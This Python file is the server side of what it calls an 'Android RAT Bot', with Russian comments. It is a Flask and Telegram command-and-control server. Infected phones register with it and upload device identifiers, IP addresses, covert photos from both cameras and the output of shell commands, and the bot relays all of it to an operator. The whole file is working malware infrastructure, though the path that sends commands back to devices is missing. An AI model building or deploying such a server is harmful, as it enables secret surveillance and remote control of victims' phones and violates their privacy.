import os
import json
import base64
import logging
import time
import threading
from flask import Flask, request, jsonify
import telebot

# ========== КОНФИГУРАЦИЯ ==========
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "YOUR_BOT_TOKEN_HERE")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 123456789))
SERVER_PORT = int(os.environ.get("PORT", 5000))

# ========== ИНИЦИАЛИЗАЦИЯ ==========
app = Flask(__name__)
bot = telebot.TeleBot(TELEGRAM_TOKEN)

devices = {}
status_data = {}
pending_photos = []
pending_results = []

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

# ========== TELEGRAM БОТ ==========

@bot.message_handler(commands=['start'])
def start(message):
    if message.chat.id != ADMIN_ID:
        bot.reply_to(message, "⛔ Access denied.")
        return
    bot.reply_to(message, 
        "✅ **Android RAT Bot** запущен.\n\n"
        "**Команды:**\n"
        "`/devices` — список устройств\n"
        "`/status [id]` — инфо\n"
        "`/photo [id]` — фото с обеих камер\n"
        "`/shell [id] [команда]` — shell",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['devices'])
def list_devices(message):
    if message.chat.id != ADMIN_ID:
        return
    if not devices:
        bot.reply_to(message, "❌ Нет устройств.")
        return
    msg = "📱 **Устройства:**\n\n"
    for did, info in devices.items():
        msg += f"🔹 `{did}` — {info.get('name', 'N/A')} (последний раз: {info.get('last_seen', 'никогда')})\n"
    bot.reply_to(message, msg, parse_mode="Markdown")

@bot.message_handler(commands=['status'])
def get_status(message):
    if message.chat.id != ADMIN_ID:
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "❌ `/status [id]`", parse_mode="Markdown")
        return
    device_id = parts[1].strip()
    if device_id not in status_data:
        bot.reply_to(message, f"❌ Нет данных для `{device_id}`", parse_mode="Markdown")
        return
    d = status_data[device_id]
    bot.reply_to(message,
        f"📊 **{device_id}**\n"
        f"📱 {d.get('model','N/A')}\n"
        f"🆔 `{d.get('android_id','N/A')}`\n"
        f"🔋 {d.get('battery','N/A')}%\n"
        f"📶 {d.get('signal','N/A')}\n"
        f"🌐 `{d.get('ip','N/A')}`\n"
        f"📅 {d.get('time','N/A')}",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['photo'])
def photo_cmd(message):
    if message.chat.id != ADMIN_ID:
        return
    bot.reply_to(message, "📸 Команда отправлена. Жди фото.")

@bot.message_handler(commands=['shell'])
def shell_cmd(message):
    if message.chat.id != ADMIN_ID:
        return
    bot.reply_to(message, "🔄 Команда отправлена. Жди результат.")

# ========== ФОН ОТПРАВКИ СООБЩЕНИЙ ==========

def send_pending():
    """Фоновый поток: отправляет фото и результаты в Telegram"""
    while True:
        try:
            # Фото
            while pending_photos:
                item = pending_photos.pop(0)
                try:
                    photo_bytes = base64.b64decode(item['photo'])
                    cam = item.get('camera', 'unknown')
                    did = item['device_id']
                    caption = f"🤳 {did} — Фронтальная" if cam == "front" else f"📷 {did} — Задняя"
                    bot.send_photo(ADMIN_ID, photo_bytes, caption=caption)
                    logger.info(f"📸 Отправлено фото {did} {cam}")
                    time.sleep(1)
                except Exception as e:
                    logger.error(f"Ошибка фото: {e}")

            # Результаты команд
            while pending_results:
                item = pending_results.pop(0)
                try:
                    did = item['device_id']
                    cmd = item['cmd']
                    result = item['result']
                    bot.send_message(ADMIN_ID,
                        f"💻 **Результат** `{did}`\n`{cmd}`\n```\n{result[:3000]}\n```",
                        parse_mode="Markdown"
                    )
                    logger.info(f"💻 Отправлен результат {did}")
                    time.sleep(1)
                except Exception as e:
                    logger.error(f"Ошибка результата: {e}")

        except Exception as e:
            logger.error(f"Ошибка фонового потока: {e}")

        time.sleep(2)

# ========== FLASK API ==========

@app.route('/')
def index():
    return jsonify({"status": "running", "devices": len(devices)})

@app.route('/register', methods=['POST'])
def register_device():
    try:
        data = request.json
        device_id = data.get('device_id')
        name = data.get('name', 'Unknown')
        model = data.get('model', 'Unknown')
        if not device_id:
            return jsonify({"error": "no id"}), 400
        devices[device_id] = {
            'name': name,
            'model': model,
            'ip': request.remote_addr,
            'last_seen': time.strftime("%Y-%m-%d %H:%M:%S")
        }
        logger.info(f"✅ Зарегистрирован: {device_id} ({name})")
        try:
            bot.send_message(ADMIN_ID, f"🆕 **Новое устройство:**\n🆔 `{device_id}`\n📛 {name}\n📱 {model}", parse_mode="Markdown")
        except:
            pass
        return jsonify({"status": "ok", "device_id": device_id})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/status', methods=['POST'])
def receive_status():
    try:
        data = request.json
        did = data.get('device_id')
        if did:
            status_data[did] = data
            if did in devices:
                devices[did]['last_seen'] = data.get('time', time.strftime("%Y-%m-%d %H:%M:%S"))
        return jsonify({"status": "ok"})
    except:
        return jsonify({"error": "bad"}), 500

@app.route('/photo', methods=['POST'])
def receive_photo():
    try:
        data = request.json
        did = data.get('device_id')
        photo = data.get('photo')
        camera = data.get('camera', 'unknown')
        if photo and did:
            pending_photos.append({'device_id': did, 'photo': photo, 'camera': camera})
            logger.info(f"📸 Фото в очереди: {did} {camera}")
        return jsonify({"status": "ok"})
    except:
        return jsonify({"error": "bad"}), 500

@app.route('/cmd_result', methods=['POST'])
def receive_cmd_result():
    try:
        data = request.json
        did = data.get('device_id')
        result = data.get('result', '')
        cmd = data.get('cmd', '')
        if did:
            pending_results.append({'device_id': did, 'cmd': cmd, 'result': result})
            logger.info(f"💻 Результат в очереди: {did} {cmd}")
        return jsonify({"status": "ok"})
    except:
        return jsonify({"error": "bad"}), 500

@app.route('/devices', methods=['GET'])
def list_api():
    return jsonify(devices)

# ========== ЗАПУСК ==========

if __name__ == '__main__':
    logger.info("🚀 Запуск сервера...")
    
    # Запускаем фоновый поток для отправки сообщений
    t = threading.Thread(target=send_pending, daemon=True)
    t.start()
    
    # Запускаем бота в отдельном потоке
    def bot_thread():
        while True:
            try:
                bot.polling(none_stop=True, interval=1, timeout=30)
            except Exception as e:
                logger.error(f"❌ Бот упал: {e}, перезапуск через 5с...")
                time.sleep(5)
    
    t2 = threading.Thread(target=bot_thread, daemon=True)
    t2.start()
    
    # Запускаем Flask (это главный поток)
    app.run(host='0.0.0.0', port=SERVER_PORT, debug=False)
